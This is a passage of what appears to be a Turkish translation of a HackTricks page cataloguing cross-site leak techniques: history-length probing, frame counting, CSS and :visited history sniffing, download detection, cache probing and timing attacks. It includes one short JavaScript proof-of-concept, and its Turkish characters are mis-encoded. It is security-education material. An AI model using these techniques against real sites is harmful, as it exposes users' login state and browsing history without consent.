Bir saldÄ±rgan JavaScript kodunu kullanarak **Ã§erÃ§eve/aÃ§Ä±lÄ±r pencerenin konumunu tahmin edilen bir yere manipÃ¼le edebilir** ve hemen **`about:blank`'e deÄŸiÅŸtirebilir**. EÄŸer geÃ§miÅŸ uzunluÄŸu artarsa, bu URL'nin doÄŸru olduÄŸunu ve **URL'nin aynÄ± olduÄŸunda yeniden yÃ¼klenmediÄŸi iÃ§in artma ÅŸansÄ± olduÄŸunu** gÃ¶sterir. EÄŸer artmazsa, bu tahmin edilen URL'yi yÃ¼klemeye Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± **ancak hemen ardÄ±ndan** **`about:blank`'i yÃ¼klediÄŸimiz iÃ§in**, geÃ§miÅŸ uzunluÄŸu tahmin edilen URL'yi yÃ¼klerken hiÃ§bir zaman artmaz.

```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```

### Kare SayÄ±mÄ±

* **Dahil Etme YÃ¶ntemleri**: Kareler, AÃ§Ä±lÄ±r Pencereler
* **AlgÄ±lanabilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Ã–zet:** `window.length` Ã¶zelliÄŸini inceleyerek iframe Ã¶ÄŸelerinin miktarÄ±nÄ± deÄŸerlendirin.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Bir web sayfasÄ±ndaki **Ã§erÃ§eve sayÄ±sÄ±nÄ±** `iframe` veya `window.open` ile aÃ§Ä±lan sayfada belirlemek, **kullanÄ±cÄ±nÄ±n o sayfadaki durumunu** belirlemeye yardÄ±mcÄ± olabilir.\
AyrÄ±ca, sayfada her zaman aynÄ± sayÄ±da Ã§erÃ§eve varsa, Ã§erÃ§eve sayÄ±sÄ±nÄ± **sÃ¼rekli olarak** kontrol etmek, sÄ±zdÄ±rÄ±labilecek bilgileri belirlemeye yardÄ±mcÄ± olabilir.

Bu tekniÄŸin bir Ã¶rneÄŸi olarak, Chrome'da bir **PDF**, iÃ§sel olarak bir `embed` kullanÄ±ldÄ±ÄŸÄ± iÃ§in **Ã§erÃ§eve sayÄ±mÄ±** ile **tespit edilebilir**. `zoom`, `view`, `page`, `toolbar` gibi bazÄ± kontrol saÄŸlayan [AÃ§Ä±k URL Parametreleri](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) vardÄ±r, bu durum ilginÃ§ olabilir.

### HTMLElements

* **Dahil Etme YÃ¶ntemleri**: HTML Ã–ÄŸeleri
* **AlgÄ±lanabilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Ã–zet:** SÄ±zan deÄŸeri okuyarak 2 olasÄ± durum arasÄ±ndaki farkÄ± ayÄ±rt edin
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

HTML Ã¶ÄŸeleri aracÄ±lÄ±ÄŸÄ±yla bilgi sÄ±zÄ±ntÄ±sÄ±, Ã¶zellikle dinamik medya dosyalarÄ± kullanÄ±cÄ± bilgilerine dayalÄ± olarak oluÅŸturulduÄŸunda veya su iÅŸaretleri eklenerek medya boyutu deÄŸiÅŸtirildiÄŸinde web gÃ¼venliÄŸinde bir endiÅŸe oluÅŸturur. Bu, saldÄ±rganlarÄ±n belirli HTML Ã¶ÄŸeleri tarafÄ±ndan aÃ§Ä±ÄŸa Ã§Ä±karÄ±lan bilgileri analiz ederek olasÄ± durumlar arasÄ±nda ayrÄ±m yapmalarÄ±nÄ± saÄŸlayabilir.

### HTML Ã–ÄŸeleri TarafÄ±ndan AÃ§Ä±ÄŸa Ã‡Ä±karÄ±lan Bilgiler

* **HTMLMediaElement**: Bu Ã¶ÄŸe medyanÄ±n `duration` ve `buffered` sÃ¼relerini ortaya Ã§Ä±karÄ±r, bu bilgilere API'si aracÄ±lÄ±ÄŸÄ±yla eriÅŸilebilir. [HTMLMediaElement hakkÄ±nda daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: `videoHeight` ve `videoWidth`'i aÃ§Ä±ÄŸa Ã§Ä±karÄ±r. BazÄ± tarayÄ±cÄ±larda, `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` ve `webkitDecodedFrameCount` gibi ek Ã¶zellikler mevcuttur, bu da medya iÃ§eriÄŸi hakkÄ±nda daha detaylÄ± bilgiler sunar. [HTMLVideoElement hakkÄ±nda daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: Bu iÅŸlev, video oynatma kalitesi hakkÄ±nda detaylar saÄŸlar, bu da iÅŸlenen video veri miktarÄ±nÄ± gÃ¶sterebilir. [getVideoPlaybackQuality() hakkÄ±nda daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: Bu Ã¶ÄŸe bir resmin `height` ve `width`'ini sÄ±zdÄ±rÄ±r. Ancak, bir resim geÃ§ersizse, bu Ã¶zellikler 0 dÃ¶ndÃ¼recek ve `image.decode()` iÅŸlevi reddedilecektir, bu da resmin doÄŸru bir ÅŸekilde yÃ¼klenemediÄŸini gÃ¶sterir. [HTMLImageElement hakkÄ±nda daha fazla bilgi edinin](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Ã–zelliÄŸi

* **Dahil Etme YÃ¶ntemleri**: HTML Ã–ÄŸeleri
* **AlgÄ±lanabilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Ã–zet:** KullanÄ±cÄ±nÄ±n durumu veya durumu ile iliÅŸkili web sitesi stilindeki deÄŸiÅŸiklikleri belirleyin.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Web uygulamalarÄ±, **kullanÄ±cÄ±nÄ±n durumuna baÄŸlÄ± olarak web sitesi stilini deÄŸiÅŸtirebilir**. Ã‡apraz kÃ¶kenli CSS dosyalarÄ±, **HTML link Ã¶ÄŸesi** ile saldÄ±rgan sayfasÄ±na gÃ¶mÃ¼lebilir ve **kurallar** saldÄ±rgan sayfaya **uygulanÄ±r**. Bir sayfa bu kurallarÄ± dinamik olarak deÄŸiÅŸtirirse, bir saldÄ±rgan bu farklarÄ± **kullanÄ±cÄ± durumuna baÄŸlÄ± olarak** tespit edebilir.\
Bir sÄ±zÄ±ntÄ± tekniÄŸi olarak, saldÄ±rgan belirli bir HTML Ã¶ÄŸesinin CSS Ã¶zelliklerini okumak iÃ§in `window.getComputedStyle` yÃ¶ntemini kullanabilir. SonuÃ§ olarak, bir saldÄ±rgan etkilenen Ã¶ÄŸe ve Ã¶zellik adÄ± biliniyorsa, keyfi CSS Ã¶zelliklerini okuyabilir.

### CSS GeÃ§miÅŸi

* **Dahil Etme YÃ¶ntemleri**: HTML Ã–ÄŸeleri
* **AlgÄ±lanabilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Ã–zet:** Bir URL'ye `:visited` stili uygulandÄ±ÄŸÄ±nda ziyaret edildiÄŸini belirleyin
* **Kod Ã–rneÄŸi**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
[**Buna**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/) gÃ¶re, bu headless Chrome'da Ã§alÄ±ÅŸmÄ±yor.
{% endhint %}

CSS `:visited` seÃ§icisi, kullanÄ±cÄ± tarafÄ±ndan daha Ã¶nce ziyaret edilmiÅŸ URL'leri farklÄ± ÅŸekilde biÃ§imlendirmek iÃ§in kullanÄ±lÄ±r. GeÃ§miÅŸte, `getComputedStyle()` yÃ¶ntemi bu stil farklarÄ±nÄ± belirlemek iÃ§in kullanÄ±labilirdi. Ancak, modern tarayÄ±cÄ±lar, bu yÃ¶ntemin bir baÄŸlantÄ±nÄ±n durumunu ortaya Ã§Ä±karmasÄ±nÄ± Ã¶nlemek iÃ§in gÃ¼venlik Ã¶nlemleri uygulamÄ±ÅŸtÄ±r. Bu Ã¶nlemler, her zaman baÄŸlantÄ±nÄ±n ziyaret edilmiÅŸ gibi hesaplanmÄ±ÅŸ stilini dÃ¶ndÃ¼rmek ve `:visited` seÃ§icisi ile uygulanabilecek stilleri kÄ±sÄ±tlamak iÃ§erir.

Bu kÄ±sÄ±tlamalara raÄŸmen, bir baÄŸlantÄ±nÄ±n ziyaret edilmiÅŸ durumunu dolaylÄ± olarak belirlemek mÃ¼mkÃ¼ndÃ¼r. Bir teknik, kullanÄ±cÄ±yÄ± CSS'den etkilenen bir alana etkileÅŸime sokarak, Ã¶zellikle `mix-blend-mode` Ã¶zelliÄŸini kullanarak kullanÄ±r. Bu Ã¶zellik, Ã¶ÄŸelerin arka planlarÄ±yla karÄ±ÅŸtÄ±rÄ±lmasÄ±na izin verir ve kullanÄ±cÄ± etkileÅŸimine dayanarak ziyaret edilmiÅŸ durumu ortaya Ã§Ä±karabilir.

AyrÄ±ca, kullanÄ±cÄ± etkileÅŸimi olmadan baÄŸlantÄ±larÄ±n render zamanlamalarÄ±nÄ± sÃ¶mÃ¼rerek algÄ±lama saÄŸlanabilir. TarayÄ±cÄ±lar ziyaret edilen ve ziyaret edilmemiÅŸ baÄŸlantÄ±larÄ± farklÄ± ÅŸekilde render edebileceÄŸinden, bu, renderleme sÃ¼recinde Ã¶lÃ§Ã¼lebilir bir zaman farkÄ± oluÅŸturabilir. Bu tekniÄŸi, ziyaret edilmiÅŸ durumu zamanlama analizi yoluyla algÄ±lanabilir hale getirmek iÃ§in birden fazla baÄŸlantÄ± kullanarak gÃ¶steren bir kanÄ±t konsepti (PoC), bir Chromium hata raporunda belirtildi.

Bu Ã¶zellikler ve yÃ¶ntemler hakkÄ±nda daha fazla ayrÄ±ntÄ± iÃ§in belgelerine gÃ¶z atÄ±n:

* `:visited`: [MDN Belgeleri](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
* `getComputedStyle()`: [MDN Belgeleri](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
* `mix-blend-mode`: [MDN Belgeleri](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

* **Dahil Etme YÃ¶ntemleri**: Frames
* **AlgÄ±lanabilir Fark**: BaÅŸlÄ±klar
* **Daha Fazla Bilgi**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Ã–zet:** Google Chrome'da, bir sayfa X-Frame-Options kÄ±sÄ±tlamalarÄ± nedeniyle Ã§apraz kÃ¶kenli bir siteye gÃ¶mÃ¼lmesi engellendiÄŸinde, Ã¶zel bir hata sayfasÄ± gÃ¶rÃ¼ntÃ¼lenir.
* **Kod Ã–rneÄŸi**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Chrome'da, `X-Frame-Options` baÅŸlÄ±ÄŸÄ± "deny" veya "same-origin" olarak ayarlanmÄ±ÅŸ bir sayfa bir nesne olarak gÃ¶mÃ¼lÃ¼yorsa, bir hata sayfasÄ± gÃ¶rÃ¼nÃ¼r. Chrome, bu nesnenin `contentDocument` Ã¶zelliÄŸi iÃ§in diÄŸer tarayÄ±cÄ±lardan farklÄ± olarak boÅŸ bir belge nesnesi (null yerine) dÃ¶ndÃ¼rÃ¼r. SaldÄ±rganlar, boÅŸ belgeyi algÄ±layarak, Ã¶zellikle geliÅŸtiriciler X-Frame-Options baÅŸlÄ±ÄŸÄ±nÄ± tutarsÄ±z bir ÅŸekilde ayarladÄ±klarÄ±nda, genellikle hata sayfalarÄ±nÄ± gÃ¶z ardÄ± ettiklerinde, kullanÄ±cÄ±nÄ±n durumu hakkÄ±nda bilgi aÃ§Ä±ÄŸa Ã§Ä±karabilir. Bu tÃ¼r sÄ±zÄ±ntÄ±larÄ± Ã¶nlemek iÃ§in gÃ¼venlik baÅŸlÄ±klarÄ±nÄ±n farkÄ±nda olunmasÄ± ve tutarlÄ± bir ÅŸekilde uygulanmasÄ± Ã¶nemlidir.

### Ä°ndirme Tespiti

* **Dahil Etme YÃ¶ntemleri**: Frames, AÃ§Ä±lÄ±r Pencereler
* **AlgÄ±lanabilir Fark**: BaÅŸlÄ±klar
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Ã–zet:** Bir saldÄ±rgan, iframeleri kullanarak dosya indirmelerini ayÄ±rt edebilir; iframenin devamlÄ± eriÅŸilebilir olmasÄ±, baÅŸarÄ±lÄ± bir dosya indirme iÅŸlemini ima eder.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

`Content-Disposition` baÅŸlÄ±ÄŸÄ±, Ã¶zellikle `Content-Disposition: attachment`, tarayÄ±cÄ±ya iÃ§eriÄŸi gÃ¶rÃ¼ntÃ¼lemek yerine indirmesini talimat verir. Bu davranÄ±ÅŸ, bir kullanÄ±cÄ±nÄ±n bir dosya indirme tetikleyen bir sayfaya eriÅŸiminin olup olmadÄ±ÄŸÄ±nÄ± tespit etmek iÃ§in sÃ¶mÃ¼rÃ¼lebilir. Chromium tabanlÄ± tarayÄ±cÄ±larda, bu indirme davranÄ±ÅŸÄ±nÄ± tespit etmek iÃ§in birkaÃ§ teknik bulunmaktadÄ±r:

1. **Ä°ndirme Ã‡ubuÄŸu Ä°zleme**:

* Bir dosya Chromium tabanlÄ± tarayÄ±cÄ±larda indirildiÄŸinde, tarayÄ±cÄ± penceresinin altÄ±nda bir indirme Ã§ubuÄŸu gÃ¶rÃ¼nÃ¼r.
* SaldÄ±rganlar, pencere yÃ¼ksekliÄŸindeki deÄŸiÅŸiklikleri izleyerek, indirme Ã§ubuÄŸunun gÃ¶rÃ¼nÃ¼mÃ¼nÃ¼ Ã§Ä±karÄ±mlayabilir ve bir indirme iÅŸleminin baÅŸlatÄ±ldÄ±ÄŸÄ±nÄ± Ã¶ne sÃ¼rebilir.

2. **Ä°framelerle Ä°ndirme Navigasyonu**:

* Bir sayfa, `Content-Disposition: attachment` baÅŸlÄ±ÄŸÄ±nÄ± kullanarak bir dosya indirme tetiklediÄŸinde, bir navigasyon olayÄ±na neden olmaz.
* Ä°Ã§eriÄŸi bir iframede yÃ¼kleyerek ve navigasyon olaylarÄ±nÄ± izleyerek, iÃ§erik dÃ¼zeninin bir dosya indirme iÅŸlemine neden olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek mÃ¼mkÃ¼ndÃ¼r (navigasyon gerÃ§ekleÅŸmez).

3. **Ä°frameler Olmadan Ä°ndirme Navigasyonu**:

* Ä°frame tekniÄŸiyle benzer ÅŸekilde, bu yÃ¶ntem bir iframe yerine `window.open` kullanmayÄ± iÃ§erir.
* Yeni aÃ§Ä±lan pencerede navigasyon olaylarÄ±nÄ± izleyerek, bir dosya indirme iÅŸleminin tetiklenip tetiklenmediÄŸi (navigasyon gerÃ§ekleÅŸmez) veya iÃ§eriÄŸin iÃ§eride gÃ¶rÃ¼ntÃ¼lendiÄŸi belirlenebilir.

YalnÄ±zca giriÅŸ yapmÄ±ÅŸ kullanÄ±cÄ±larÄ±n bu tÃ¼r indirmeleri tetikleyebildiÄŸi senaryolarda, bu teknikler, tarayÄ±cÄ±nÄ±n indirme isteÄŸine verdiÄŸi yanÄ±ta dayanarak dolaylÄ± olarak kullanÄ±cÄ±nÄ±n kimlik doÄŸrulama durumunu Ã§Ä±karabilir.

### BÃ¶lÃ¼mlenmiÅŸ HTTP Ã–nbellek Atlatma <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Dahil Etme YÃ¶ntemleri**: AÃ§Ä±lÄ±r Pencereler
* **AlgÄ±lanabilir Fark**: Zamanlama
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Ã–zet:** Bir saldÄ±rgan, iframeleri kullanarak dosya indirmelerini ayÄ±rt edebilir; iframenin devamlÄ± eriÅŸilebilir olmasÄ±, baÅŸarÄ±lÄ± bir dosya indirme iÅŸlemini ima eder.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (from [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Bu teknik neden ilginÃ§: Chrome artÄ±k **Ã¶nbellek bÃ¶lÃ¼mlendirmesine** sahip ve yeni aÃ§Ä±lan sayfanÄ±n Ã¶nbellek anahtarÄ± ÅŸudur: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, ancak bir ngrok sayfasÄ± aÃ§arsam ve iÃ§inde fetch kullanÄ±rsam, Ã¶nbellek anahtarÄ± ÅŸu olacaktÄ±r: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, **Ã¶nbellek anahtarÄ± farklÄ±dÄ±r**, bu nedenle Ã¶nbellek paylaÅŸÄ±lamaz. Daha fazla ayrÄ±ntÄ±ya buradan ulaÅŸabilirsiniz: [Ã–nbelleÄŸi bÃ¶lmekle gÃ¼venlik ve gizlilik kazanma](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Yorum [**buradan**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

EÄŸer bir site `example.com`, `*.example.com/resource` kaynaÄŸÄ±nÄ± iÃ§eriyorsa, o kaynaÄŸÄ±n **Ã¶nbellekleme anahtarÄ±**, kaynaÄŸÄ±n doÄŸrudan **Ã¼st dÃ¼zey gezinme** ile istenmiÅŸ gibi olacaktÄ±r. Ã‡Ã¼nkÃ¼ Ã¶nbelleÄŸe eriÅŸmek, bir kaynaÄŸÄ± yÃ¼klemekten daha hÄ±zlÄ±dÄ±r, sayfanÄ±n konumunu deÄŸiÅŸtirmeye Ã§alÄ±ÅŸabilir ve durdurmayÄ± 20ms (Ã¶rneÄŸin) sonra iptal etmeye Ã§alÄ±ÅŸabilirsiniz. EÄŸer durdurmadan sonra kÃ¶ken deÄŸiÅŸtiyse, kaynaÄŸÄ±n Ã¶nbelleÄŸe alÄ±ndÄ±ÄŸÄ± anlamÄ±na gelir.\
Ya da sadece **potansiyel olarak Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ sayfaya bazÄ± fetch gÃ¶nderebilir ve alÄ±nan zamanÄ± Ã¶lÃ§ebilirsiniz**.

### Manuel YÃ¶nlendirme <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Dahil Etme YÃ¶ntemleri**: Fetch API
* **AlgÄ±lanabilir Fark**: YÃ¶nlendirmeler
* **Daha Fazla Bilgi**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Ã–zet:** Bir fetch isteÄŸine verilen yanÄ±tÄ±n bir yÃ¶nlendirme olup olmadÄ±ÄŸÄ±nÄ± bulmak mÃ¼mkÃ¼ndÃ¼r
* **Kod Ã–rneÄŸi**:

![](<../../.gitbook/assets/image (652).png>)

### AbortController ile Fetch <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Dahil Etme YÃ¶ntemleri**: Fetch API
* **AlgÄ±lanabilir Fark**: Zamanlama
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Ã–zet:** Bir kaynaÄŸÄ± yÃ¼klemeye Ã§alÄ±ÅŸabilir ve yÃ¼klenmeden Ã¶nce yÃ¼klemenin kesilmesi mÃ¼mkÃ¼ndÃ¼r. Bir hata tetiklenirse, kaynaÄŸÄ±n Ã¶nbelleÄŸe alÄ±nÄ±p alÄ±nmadÄ±ÄŸÄ±na baÄŸlÄ± olarak, kaynak Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸtÄ±r veya alÄ±nmamÄ±ÅŸtÄ±r.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Yeni iÃ§erik Ã¶nbelleÄŸe alÄ±nmadan belirli bir kaynaÄŸÄ± tarayÄ±cÄ± Ã¶nbelleÄŸinden Ã§Ä±karmak ve kaynaÄŸÄ±n Ã¶nbelleÄŸe alÄ±nÄ±p alÄ±nmadÄ±ÄŸÄ±nÄ± tespit etmek iÃ§in _**fetch**_ ve _**setTimeout**_ kullanÄ±n. AyrÄ±ca, yeni iÃ§erik Ã¶nbelleÄŸe alÄ±nmadan iÅŸlem gerÃ§ekleÅŸir.

### Script KirliliÄŸi

* **Dahil Etme YÃ¶ntemleri**: HTML ElemanlarÄ± (script)
* **AlgÄ±lanabilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Ã–zet:** **Dahili fonksiyonlarÄ± Ã¼zerine yazmak** ve hatta **Ã§apraz kaynaklÄ± script'ten** (doÄŸrudan okunamayan) bu argÃ¼manlarÄ± okumak mÃ¼mkÃ¼ndÃ¼r, bu deÄŸerli bilgilerin **sÄ±zmasÄ±na** neden olabilir.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Hizmet Ä°ÅŸÃ§ileri <a href="#service-workers" id="service-workers"></a>

* **Dahil Etme YÃ¶ntemleri**: AÃ§Ä±lÄ±r Pencereler
* **AlgÄ±lanabilir Fark**: Sayfa Ä°Ã§eriÄŸi
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Ã–zet:** Bir web sitesinin yÃ¼rÃ¼tme sÃ¼resini hizmet iÅŸÃ§ileri kullanarak Ã¶lÃ§Ã¼n.
* **Kod Ã–rneÄŸi**:

Verilen senaryoda, saldÄ±rgan, Ã¶zellikle "saldÄ±rgan.com" alanlarÄ±ndan birinde bir **hizmet iÅŸÃ§isi** kaydetmek iÃ§in giriÅŸimi ele alÄ±r. Sonra, saldÄ±rgan hedef web sitesinde yeni bir pencere aÃ§ar ve **hizmet iÅŸÃ§isine** ana belgeden bir zamanlayÄ±cÄ± baÅŸlatmasÄ±nÄ± talimat verir. Yeni pencere yÃ¼klenmeye baÅŸladÄ±ÄŸÄ±nda, saldÄ±rgan Ã¶nceki adÄ±mda elde edilen referansÄ± **hizmet iÅŸÃ§isi** tarafÄ±ndan yÃ¶netilen bir sayfaya yÃ¶nlendirir.

Ã–nceki adÄ±mda baÅŸlatÄ±lan isteÄŸin varÄ±ÅŸÄ±nda, **hizmet iÅŸÃ§isi** etkili bir ÅŸekilde navigasyon sÃ¼recini sonlandÄ±ran bir **204 (Ä°Ã§erik Yok)** durum kodu ile yanÄ±t verir. Bu noktada, **hizmet iÅŸÃ§isi** Ã¶nceki adÄ±mda baÅŸlatÄ±lan zamanlayÄ±cÄ±dan bir Ã¶lÃ§Ã¼m yakalar. Bu Ã¶lÃ§Ã¼m, navigasyon sÃ¼recinde gecikmelere neden olan JavaScript'in sÃ¼resinden etkilenir.

{% hint style="warning" %}
Bir yÃ¼rÃ¼tme zamanlamasÄ±nda **aÄŸ faktÃ¶rlerini ortadan kaldÄ±rmak** ve **daha kesin Ã¶lÃ§Ã¼mler** elde etmek mÃ¼mkÃ¼ndÃ¼r. Ã–rneÄŸin, sayfanÄ±n yÃ¼klenmeden Ã¶nce kullandÄ±ÄŸÄ± kaynaklarÄ± yÃ¼kleyerek.
{% endhint %}

### Getirme ZamanlamasÄ±

* **Dahil Etme YÃ¶ntemleri**: Getirme API'si
* **AlgÄ±lanabilir Fark**: Zamanlama (genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Ã–zet:** Bir isteÄŸi gerÃ§ekleÅŸtirmenin ne kadar zaman aldÄ±ÄŸÄ±nÄ± Ã¶lÃ§mek iÃ§in [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) kullanÄ±n. DiÄŸer saatler de kullanÄ±labilir.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Ã‡apraz-Pencere ZamanlamasÄ±

* **Dahil Etme YÃ¶ntemleri**: AÃ§Ä±lÄ±r Pencereler
* **AlgÄ±lanabilir Fark**: Zamanlama (genellikle Sayfa Ä°Ã§eriÄŸi, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Ã–zet:** `window.open` kullanarak bir isteÄŸi gerÃ§ekleÅŸtirmenin ne kadar zaman aldÄ±ÄŸÄ±nÄ± Ã¶lÃ§mek iÃ§in [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) kullanÄ±n. DiÄŸer saatler de kullanÄ±labilir.
* **Kod Ã–rneÄŸi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n **en geliÅŸmiÅŸ** topluluk araÃ§larÄ± tarafÄ±ndan desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturun ve otomatikleÅŸtirin**.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## HTML veya Yeniden Enjeksiyon ile

Burada, bir Ã§apraz kaynaktan HTML'den bilgi sÄ±zdÄ±rmak iÃ§in teknikler bulabilirsiniz **HTML iÃ§eriÄŸi enjekte ederek**. Bu teknikler, herhangi bir nedenle **HTML enjekte edebilir ancak JS kodu enjekte edemezsiniz** durumlarÄ±nda ilginÃ§tir.

### Sarkan Ä°ÅŸaretleme

{% content-ref url="../dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](../dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### GÃ¶rÃ¼ntÃ¼ Tembel YÃ¼kleme

EÄŸer **iÃ§erik sÄ±zdÄ±rmak** ve **gizli Ã¶ncesi HTML ekleyebiliyorsanÄ±z** **ortak sarkan iÅŸaretleme tekniklerini** kontrol etmelisiniz.\
